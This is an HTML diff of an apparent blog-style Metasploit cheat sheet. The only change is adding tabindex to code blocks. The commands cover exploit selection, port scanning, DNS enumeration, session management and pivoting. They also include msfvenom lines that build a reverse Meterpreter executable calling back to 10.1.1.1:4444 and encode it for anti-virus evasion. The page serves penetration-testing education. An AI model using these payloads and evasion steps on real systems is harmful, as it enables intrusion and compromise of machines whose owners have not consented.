@@ -99,43 +99,43 @@ Sunday, Feb 21, 2021
 <p>Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.</p>
 <h4 id=metasploit->Metasploit :</h4>
 <h6 id=search-for-module>Search for module:</h6>
-<pre><code>msf &gt; search [regex]
+<pre tabindex=0><code>msf &gt; search [regex]
 </code></pre><h6 id=specify-and-exploit-to-use>Specify and exploit to use:</h6>
-<pre><code>msf &gt; use exploit/[ExploitPath]
+<pre tabindex=0><code>msf &gt; use exploit/[ExploitPath]
 </code></pre><h6 id=specify-a-payload-to-use>Specify a Payload to use:</h6>
-<pre><code>msf &gt; set PAYLOAD [PayloadPath]
+<pre tabindex=0><code>msf &gt; set PAYLOAD [PayloadPath]
 </code></pre><h6 id=show-options-for-the-current-modules>Show options for the current modules:</h6>
-<pre><code>msf &gt; show options
+<pre tabindex=0><code>msf &gt; show options
 </code></pre><h6 id=set-options>Set options:</h6>
-<pre><code>msf &gt; set [Option] [Value]
+<pre tabindex=0><code>msf &gt; set [Option] [Value]
 </code></pre><h6 id=start-exploit>Start exploit:</h6>
-<pre><code>msf &gt; exploit 
+<pre tabindex=0><code>msf &gt; exploit 
 </code></pre><h5 id=useful-auxiliary-modules>Useful Auxiliary Modules</h5>
 <h6 id=port-scanner>Port Scanner:</h6>
-<pre><code>msf &gt; use auxiliary/scanner/portscan/tcp
+<pre tabindex=0><code>msf &gt; use auxiliary/scanner/portscan/tcp
 msf &gt; set RHOSTS 10.10.10.0/24
 msf &gt; run
 </code></pre><h6 id=dns-enumeration>DNS Enumeration:</h6>
-<pre><code>msf &gt; use auxiliary/gather/dns_enum
+<pre tabindex=0><code>msf &gt; use auxiliary/gather/dns_enum
 msf &gt; set DOMAIN target.tgt
 msf &gt; run
 </code></pre><h6 id=ftp-server>FTP Server:</h6>
-<pre><code>msf &gt; use auxiliary/server/ftp
+<pre tabindex=0><code>msf &gt; use auxiliary/server/ftp
 msf &gt; set FTPROOT /tmp/ftproot
 msf &gt; run
 </code></pre><h6 id=proxy-server>Proxy Server:</h6>
-<pre><code>msf &gt; use auxiliary/server/socks4
+<pre tabindex=0><code>msf &gt; use auxiliary/server/socks4
 msf &gt; run 
 </code></pre><h4 id=msfvenom->msfvenom :</h4>
 <p>The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode
 them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.</p>
-<pre><code>$ msfvenom –p [PayloadPath]
+<pre tabindex=0><code>$ msfvenom –p [PayloadPath]
 –f [FormatType]
 LHOST=[LocalHost (if reverse conn.)]
 LPORT=[LocalPort]
 </code></pre><p>Example :</p>
 <p>Reverse Meterpreter payload as an executable and redirected into a file:</p>
-<pre><code>$ msfvenom -p windows/meterpreter/
+<pre tabindex=0><code>$ msfvenom -p windows/meterpreter/
 reverse_tcp -f exe LHOST=10.1.1.1
 LPORT=4444 &gt; met.exe
 </code></pre><p>Format Options (specified with –f) &ndash;help-formats – List available output formats</p>
@@ -147,13 +147,13 @@ c – C code</p>
 <p>Encoding Payloads with msfvenom</p>
 <p>The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with &lsquo;-l encoders&rsquo;
 to get a list of encoders.</p>
-<pre><code>$ msfvenom -p [Payload] -e [Encoder] -f
+<pre tabindex=0><code>$ msfvenom -p [Payload] -e [Encoder] -f
 [FormatType] -i [EncodeInterations]
 LHOST=[LocalHost (if reverse conn.)]
 LPORT=[LocalPort]
 </code></pre><p>Example</p>
 <p>Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:</p>
-<pre><code>$ msfvenom -p windows/meterpreter/
+<pre tabindex=0><code>$ msfvenom -p windows/meterpreter/
 reverse_tcp -i 5 -e x86/shikata_ga_nai -f
 exe LHOST=10.1.1.1 LPORT=4444 &gt; mal.exe
 </code></pre><h5 id=metasploit-meterpreter>Metasploit Meterpreter</h5>
@@ -205,25 +205,25 @@ exe LHOST=10.1.1.1 LPORT=4444 &gt; mal.exe
 <h5 id=managing-sessions>Managing Sessions</h5>
 <h6 id=multiple-exploitation>Multiple Exploitation:</h6>
 <p>Run the exploit expecting a single session that is immediately backgrounded:</p>
-<pre><code>msf &gt; exploit -z
+<pre tabindex=0><code>msf &gt; exploit -z
 </code></pre><p>Run the exploit in the background expecting one or more sessions that are immediately backgrounded:</p>
-<pre><code>msf &gt; exploit –j
+<pre tabindex=0><code>msf &gt; exploit –j
 </code></pre><h6 id=list-all-current-jobs-usually-exploit-listeners>List all current jobs (usually exploit listeners):</h6>
-<pre><code>msf &gt; jobs –l
+<pre tabindex=0><code>msf &gt; jobs –l
 </code></pre><h6 id=kill-a-job>Kill a job:</h6>
-<pre><code>msf &gt; jobs –k [JobID]
+<pre tabindex=0><code>msf &gt; jobs –k [JobID]
 </code></pre><h5 id=multiple-sessions>Multiple Sessions:</h5>
 <h6 id=list-all-backgrounded-sessions>List all backgrounded sessions:</h6>
-<pre><code>msf &gt; sessions -l
+<pre tabindex=0><code>msf &gt; sessions -l
 </code></pre><h6 id=interact-with-a-backgrounded-session>Interact with a backgrounded session:</h6>
-<pre><code>msf &gt; session -i [SessionID]
+<pre tabindex=0><code>msf &gt; session -i [SessionID]
 </code></pre><h6 id=background-the-current-interactive-session>Background the current interactive session:</h6>
-<pre><code>meterpreter &gt; &lt;Ctrl+Z&gt;
+<pre tabindex=0><code>meterpreter &gt; &lt;Ctrl+Z&gt;
 or
 meterpreter &gt; background
 </code></pre><h6 id=routing-through-sessions>Routing Through Sessions:</h6>
 <p>All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.</p>
-<pre><code>msf &gt; route add [Subnet to Route To]
+<pre tabindex=0><code>msf &gt; route add [Subnet to Route To]
 [Subnet Netmask] [SessionID]
 </code></pre></article>
 </section>
